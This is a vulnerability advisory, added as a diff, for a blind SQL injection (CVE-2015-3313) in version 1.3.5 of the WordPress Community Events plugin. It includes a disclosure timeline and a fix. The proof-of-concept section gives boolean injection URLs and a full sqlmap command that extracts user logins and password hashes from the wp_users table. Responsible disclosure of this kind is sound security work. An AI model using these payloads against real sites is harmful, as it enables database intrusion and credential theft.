@@ -1,0 +1,80 @@
+=======================================================================
+              title: SQL Injection
+            product: WordPress Community Events Plugin
+ vulnerable version: 1.3.5 (and probably below)
+      fixed version: 1.4
+         CVE number: CVE-2015-3313
+             impact: CVSS Base Score 7.5 (AV:N/AC:L/Au:N/C:P/I:P/A:P)
+           homepage: https://wordpress.org/plugins/community-events/
+              found: 2015-01-07
+                 by: Hannes Trunde
+                     
+               mail: hannes.trunde@gmail.com
+            twitter: @hannestrunde
+
+=======================================================================
+
+
+Plugin description:
+-------------------
+"The purpose of this plugin is to allow users to create a schedule of upcoming 
+events and display events for the next 7 days in an AJAX-driven box or 
+displaying a full list of upcoming events."
+
+Source: https://wordpress.org/plugins/community-events/
+
+
+Recommendation:
+---------------
+The author has provided a fixed plugin version which should be installed 
+immediately.
+
+
+Vulnerability overview/description:
+-----------------------------------
+Because of insufficient input validation, a blind SQL injection attack can be
+performed within the search function to obtain sensitive information from the 
+database. To exploit this vulnerability, there has to be at least one planned 
+event on the calendar.
+
+
+Proof of concept:
+-----------------
+The following HTTP request to the Community Events full schedule returns the 
+event(s) planned in the specified year:
+===============================================================================
+http://www.site.com/?page_id=2&eventyear=2015 AND 1=1 )--&dateset=on&eventday=1
+===============================================================================
+
+The following HTTP request returns a blank page, thus confirming the blind SQL
+injection vulnerability:
+===============================================================================
+http://www.site.com/?page_id=2&eventyear=2015 AND 1=0 )--&dateset=on&eventday=1
+===============================================================================
+
+Obtaining users and password hashes with sqlmap may look as follows (--string 
+parameter has to contain (part of) the name of the event, enabling sqlmap to 
+differentiate between true and false statements):
+================================================================================
+sqlmap -u "http://www.site.com/?page_id=2&eventyear=2015&dateset=on&eventday=1" -p "eventyear" --technique=B --dbms=mysql --suffix=")--" --string="Test" --sql-query="select user_login,user_pass from wp_users"
+================================================================================
+
+
+Contact timeline:
+-----------------
+2015-04-08: Contacting author via mail.
+2015-04-09: Author replies and announces a fix within a week.
+2015-04-12: Mail from author, stating that plugin has been updated.
+2015-04-14: Posting information to the open source software security mailing 
+            list: http://openwall.com/lists/oss-security/2015/04/14/5
+2015-04-18: Release of security advisory.
+
+
+Solution:
+---------
+Update to the most recent plugin version.
+
+
+Workaround:
+-----------
+See solution.
